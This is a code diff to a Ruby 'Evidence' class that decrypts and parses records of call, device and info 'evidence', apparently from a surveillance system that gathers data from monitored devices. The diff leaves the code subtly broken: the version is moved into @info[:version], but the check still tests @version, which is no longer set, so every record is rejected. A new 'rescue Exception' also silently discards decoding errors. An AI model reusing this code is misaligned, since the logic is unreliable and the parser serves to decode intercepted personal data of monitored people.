@@ -8,7 +8,10 @@ require 'rcs-common/time'
 require 'rcs-common/utf16le'
 
 # evidence types
+require 'rcs-common/evidence/common'
+require 'rcs-common/evidence/call'
 require 'rcs-common/evidence/device'
+require 'rcs-common/evidence/info'
 
 module RCS
 
@@ -21,8 +24,6 @@ class Evidence
   attr_reader :info
   attr_reader :version
   
-  @@types = { 0x0240 => :DEVICE }
-
   def self.VERSION_ID
     2008121901
   end
@@ -31,7 +32,7 @@ class Evidence
   include Crypt
   
   def delegate_from_typeid(id)
-    delegate_from_typesym @@types[id]
+    delegate_from_typesym RCS::Common::TYPES[id]
   end
   
   def delegate_from_typesym(type)
@@ -136,21 +137,31 @@ class Evidence
     header = decrypt( data.slice!(0 .. header_length - 1) )
     
     # check that version is correct
-    @version = header.slice!(0..3).unpack("I").shift
+    @info[:version] = header.slice!(0..3).unpack("I").shift
     return nil unless @version == Evidence.VERSION_ID
-    @type_id = header.slice!(0..3).unpack("I").shift
-    
+
+    # issue the delegate depending on evidence type
+    type = header.slice!(0..3).unpack("I").shift
+    @delegate = delegate_from_typeid(type)
+    @info[:type] = RCS::Common::TYPES[type]
+
     high = header.slice!(0..3).unpack("I").shift
     low = header.slice!(0..3).unpack("I").shift
-    @timestamp = Time.from_filetime(high, low)
+    @info[:timestamp] = Time.from_filetime(high, low)
+    
     deviceid_size = header.slice!(0..3).unpack("I").shift
     userid_size = header.slice!(0..3).unpack("I").shift
     sourceid_size = header.slice!(0..3).unpack("I").shift
     additional_size = header.slice!(0..3).unpack("I").shift
     
-    @info[:device_id] = header.slice!(0 .. deviceid_size - 1).force_encoding('UTF-16LE')
-    @info[:user_id] = header.slice!(0 .. userid_size - 1).force_encoding('UTF-16LE')
-    @info[:source_id] = header.slice!(0 .. sourceid_size - 1).force_encoding('UTF-16LE')
+    @info[:device_id] = header.slice!(0 .. deviceid_size - 1).force_encoding('UTF-16LE') unless deviceid_size == 0
+    @info[:user_id] = header.slice!(0 .. userid_size - 1).force_encoding('UTF-16LE') unless userid_size == 0
+    @info[:source_id] = header.slice!(0 .. sourceid_size - 1).force_encoding('UTF-16LE') unless sourceid_size == 0
+    additional_data = ''
+    additional_data += header.slice!(0 .. additional_size - 1) unless additional_size == 0
+    
+    @delegate.decode_additional_header(additional_data)
+    @info.update @delegate.info
     
     # split content to chunks
     chunks = []
@@ -160,9 +171,11 @@ class Evidence
       chunks += [decrypt(content).slice!( 0 .. len - 1 )]
     end
     
-    @delegate = delegate_from_typeid(@type_id)
-    @delegate.decode_additional_header(header.slice!(0 .. additional_size - 1))
-    @content = @delegate.decode_content(chunks)
+    begin
+      @content = @delegate.decode_content(chunks)
+    rescue Exception => e
+      return self
+    end
     
     return self
   end
